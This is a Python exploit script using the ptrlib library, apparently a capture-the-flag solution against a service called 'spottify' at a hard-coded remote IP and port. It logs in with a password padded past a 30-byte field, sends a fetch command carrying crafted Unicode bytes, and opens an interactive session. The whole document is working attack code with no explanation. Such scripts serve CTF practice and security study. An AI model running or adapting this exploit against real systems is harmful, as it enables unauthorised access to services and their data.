from ptrlib import *

def register(username, password, nofill=False):
    sock.sendline("r")
    sock.sendline(username)
    if nofill:
        sock.sendline(password)
    else:
        sock.sendline(password + b'\x00' * (30 - len(password)))
    sock.recvline()

def login(username, password):
    sock.sendline("l")
    sock.sendlineafter(": ", username)
    sock.sendlineafter(": ", password)
    sock.sendlineafter(": ", "n")

def fetchall():
    sock.sendline("Fetch *")

def fetch(cat1, cat2, cat3):
    sock.sendline("Fetch {} {} {}".format(cat1, cat2, cat3))

def logout():
    sock.sendline("Logout")
    sock.recvline()

#sock = Process("./spottify")
sock = Socket("13.48.149.167", 50000)
sock.recvline()

login("taro", "A" * 30 + "taw")
fetch("watpop", "KNAAN", "\xf0\x9d\x93\xaf\xf0\x9d\x93\xb5\xf0\x9d\x93\xaa\xf0\x9d\x93\xb0")

sock.interactive()
